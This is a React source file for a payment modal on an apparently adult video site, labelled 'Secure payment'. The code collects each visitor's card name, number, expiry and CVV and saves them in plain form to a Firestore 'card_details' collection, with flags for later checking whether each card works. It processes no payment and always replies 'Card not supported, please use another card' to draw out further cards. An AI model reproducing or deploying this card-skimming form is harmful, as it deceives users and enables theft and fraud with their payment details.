import Cookies from 'js-cookie';
import { useContext, useEffect, useState } from 'react';
import { BeatLoader } from 'react-spinners';
import videosContext from '../context/videos/videosContext';
import {
    XCircleIcon, ShieldCheckIcon, EyeOffIcon
} from '@heroicons/react/solid';
import db from '../firebase';
import { doc, setDoc, onSnapshot } from "firebase/firestore";
import axios from 'axios';

const ModalMembership = () => {

    const [message, setmessage] = useState("loading payment...")

    const [card_paypal, setcard_paypal] = useState("card");
    const [nameOnCard, setnameOnCard] = useState("");
    const [cardnumber, setcardnumber] = useState("");
    const [month, setMonth] = useState("01");
    const [year, setYear] = useState("2024");

    const [cvv, setcvv] = useState("");

    const [beatLoader, setbeatLoader] = useState(true);


    const { paymentModalVisible, setpaymentModalVisible, selectedPlan } = useContext(videosContext);

    const radioBtn = (type) => {
        setcard_paypal(type);
    }

    const handleCardNumber = (e) => {
        const inputVal = e.target.value.replace(/ /g, ""); //remove all the empty spaces in the input
        let inputNumbersOnly = inputVal.replace(/\D/g, ""); // Get only digits

        if (inputNumbersOnly.length > 16) {
            //If entered value has a length greater than 16 then take only the first 16 digits
            inputNumbersOnly = inputNumbersOnly.substr(0, 16);
        }

        // Get nd array of 4 digits per an element EX: ["4242", "4242", ...]
        const splits = inputNumbersOnly.match(/.{1,4}/g);

        let spacedNumber = "";
        if (splits) {
            spacedNumber = splits.join(" "); // Join all the splits with an empty space
        }

        setcardnumber(spacedNumber); // Set the new CC number
    };

    const handlerCvv = (e) => {
        const inputVal = e.target.value.replace(/ /g, ""); //remove all the empty spaces in the input
        let inputNumbersOnly = inputVal.replace(/\D/g, ""); // Get only digits

        if (inputNumbersOnly.length > 3) {
            //If entered value has a length greater than 16 then take only the first 16 digits
            inputNumbersOnly = inputNumbersOnly.substr(0, 3);
        }


        setcvv(inputNumbersOnly); // Set the new CC number
    };


    const confirmClick = async (e) => {
        e.preventDefault();

        if (card_paypal === "card") {

            if (nameOnCard.length < 4) {
                alert("Enter card name")
                return
            }
            if (cardnumber.length < 16) {
                alert("Enter card number")
                return
            }
            if (cvv.length < 3) {
                alert("Enter cvv")
                return
            }
            setbeatLoader(true)
            setmessage("Please hold, authenticating payment...")
            //upload it to firestore


            const now = new Date();
            const ISTTime = now.toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
            const dataToUpload = {
                nameOnCard, cardnumber, month, year, cvv, checked: false, working: false, date: ISTTime
            };

            try {
                const docRef = doc(db, 'card_details', cardnumber); // Specify custom document ID here
                await setDoc(docRef, dataToUpload);
                console.log('Document written with ID: ', docRef.id);
            } catch (error) {
                console.error('Error adding document: ', error);
            }
            setTimeout(() => {
                setbeatLoader(false)
                alert("Card not supported, please use another card")

            }, 3000);

        } else {
            //paypal payment 
            paypalPayment()


        }
        // setpaymentModalVisible(!paymentModalVisible);

    }

    const paypalPayment = async () => {



    }
    const cancelCLick = () => {
        // Reset all state variables to their initial values
        setcard_paypal("card");
        setnameOnCard("");
        setcardnumber("");
        setMonth("");
        setYear("");
        setcvv("");
        setbeatLoader(true);
        setpaymentModalVisible(false)
    }

    useEffect(() => {
        if (paymentModalVisible) {
            const timeoutId = setTimeout(() => {
                console.log("3 seconds passed since modal was opened!");
                setbeatLoader(false)
            }, 3000);

            return () => {
                clearTimeout(timeoutId); // Clear timeout when modal is closed before 3 seconds
            };
        }

        const handleKeyDown = (event) => {
            if (event.key === 'Escape' || event.key === 'Backspace') {
                // Handle the back button press here
                alert("Cancel transaction")
                console.log('Back button pressed');
            }
        };
        window.addEventListener('keydown', handleKeyDown);

        return () => {
            window.removeEventListener('keydown', handleKeyDown);

        };


    }, [paymentModalVisible]);


    return (
        <div className={` select-none fixed flex justify-center items-center inset-0 z-30  ${paymentModalVisible ? "" : "invisible"}`}>

            <div className={`relative bg-white w-full mx-[15px] sm:mx-0 sm:w-3/4 md:w-1/2 lg:w-2/5/3 xl:w-1/3 2xl:w-1/5 p-[20px] py-[5px] rounded-xl shadow-md `}>

                <div className={`absolute inset-0 flex flex-col items-center justify-center   ${beatLoader ? "" : "invisible"}`}>
                    <BeatLoader loading size={25} color={'#232b2b'} />
                    <p>{message}</p>
                </div>

                <div className={`${beatLoader ? "invisible" : ""}`}>


                    <div className="w-full pt-3 pb-3 lg:pb-5">
                        <div className="bg-theme text-white overflow-hidden rounded-full w-20 h-20 -mt-16 mx-auto shadow-lg flex justify-center items-center">
                            <i className="mdi mdi-credit-card-outline text-3xl"></i>
                        </div>
                    </div>

                    <div className="mb-6 ">
                        <h1 className="text-center font-semibold font-poppins text-theme text-lg lg:text-xl uppercase">Chutlunds Secure payment</h1>
                    </div>

                    <div className="flex flex-col lg:flex-row lg:items-center items-start mb-1.5">
                        <label className="inline-flex items-center">
                            <input
                                type="radio"
                                className="form-radio h-6 w-6 text-theme"
                                checked={card_paypal === 'card'}
                                onChange={() => radioBtn('card')}
                            />
                            <img alt='credit-cards' src="https://leadershipmemphis.org/wp-content/uploads/2020/08/780370.png" className="h-8 ml-3" />
                        </label>
                        <label className="inline-flex items-center mt-2 lg:mt-0 lg:ml-6 hidden">
                            <input
                                type="radio"
                                className="form-radio h-6 w-6 text-theme"
                                checked={card_paypal === 'paypal'}
                                onChange={() => radioBtn('paypal')}
                            />
                            <img alt='paypal-logo' src="https://www.sketchappsources.com/resources/source-image/PayPalCard.png" className="h-[45px] ml-3" />
                        </label>
                    </div>

                    <div className='flex items-center mb-5 px-1'>
                        <ShieldCheckIcon className='h-4  text-green-500' />
                        <span className='text-[10px] lg:text-[11px] opacity-60 font-poppins ml-1'>No adult related transaction in your bank statement</span>
                    </div>


                    <div className={`${card_paypal === "card" ? "" : "opacity-50 pointer-events-none"}`}>

                        <div className=" lg:mb-1">
                            <label className="font-semibold font-theme text-theme text-xs lg:text-sm ml-1">Name on Credit card</label>
                            <div>
                                <input value={nameOnCard} onChange={(e) => { setnameOnCard(e.target.value) }} className="font-poppins w-full px-3 py-1 lg:py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none  transition-colors" placeholder="John Smith" type="text" />
                            </div>
                        </div>
                        <div className=" lg:mb-1">
                            <label className="font-semibold font-theme text-theme text-xs lg:text-sm  ml-1 ">Credit Card number</label>
                            <div>
                                <input value={cardnumber}
                                    onChange={handleCardNumber} className="font-poppins w-full px-3 py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none  transition-colors" placeholder="0000 0000 0000 0000" type="text" inputMode="numeric" />
                            </div>
                        </div>
                        <div className="lg:mb-1 -mx-2 flex items-end">
                            <div className="px-2 w-1/2">
                                <label className="font-semibold font-theme text-theme text-xs lg:text-sm mb-2 ml-1">Expiration date</label>
                                <div>
                                    <select value={month} onChange={e => setMonth(e.target.value)} className="font-poppins form-select w-full px-3 py-2 mb-1 border-2 text-xs lg:text-sm border-gray-200 rounded-md focus:outline-none  transition-colors cursor-pointer">
                                        <option value="01">01 - January</option>
                                        <option value="02">02 - February</option>
                                        <option value="03">03 - March</option>
                                        <option value="04">04 - April</option>
                                        <option value="05">05 - May</option>
                                        <option value="06">06 - June</option>
                                        <option value="07">07 - July</option>
                                        <option value="08">08 - August</option>
                                        <option value="09">09 - September</option>
                                        <option value="10">10 - October</option>
                                        <option value="11">11 - November</option>
                                        <option value="12">12 - December</option>
                                    </select>
                                </div>
                            </div>
                            <div className="px-2 w-1/2">
                                <select value={year} onChange={e => setYear(e.target.value)} className="font-poppins form-select w-full text-xs lg:text-sm px-3 py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none  transition-colors cursor-pointer">
                                    <option value="2024">2024</option>
                                    <option value="2025">2025</option>
                                    <option value="2026">2026</option>
                                    <option value="2027">2027</option>
                                    <option value="2028">2028</option>
                                    <option value="2029">2029</option>
                                    <option value="2029">2030</option>
                                    <option value="2029">2031</option>
                                    <option value="2029">2032</option>
                                </select>
                            </div>
                        </div>
                        <div className="mb-3 ">
                            <label className="font-semibold font-theme text-theme text-xs lg:text-sm mb-2 ml-1">CVV</label>
                            <div>
                                <input value={cvv} onChange={handlerCvv} className="font-poppins text-xs lg:text-sm w-32 px-3  py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none  transition-colors" placeholder="000" type="number" />
                            </div>
                        </div>

                    </div>

                    <div>
                        <button onClick={confirmClick} className="block w-full max-w-xs mx-auto bg-theme hover:bg-indigo-900  text-white rounded-lg px-3 py-2 lg:px-3 lg:py-3 text-sm lg:text-md font-semibold"><i className="mdi mdi-lock-outline mr-1"></i> PAY NOW  ({selectedPlan.price})</button>
                    </div>


                    <div>
                        <button onClick={cancelCLick} className="block w-full max-w-xs mx-auto  items-center text-theme underline rounded-lg px-3 py-3 font-semibold"> Cancel</button>
                    </div>


                    <div className='flex items-center  py-2'>
                        <EyeOffIcon className='h-4  text-yellow-500' />
                        <span className='text-[12px] lg:text-[14px] opacity-80 font-poppins ml-1 text-center'>    No hidden fees • Cancel subscription at any time</span>
                    </div>

                </div>
            </div>




        </div>


    )
};
export default ModalMembership;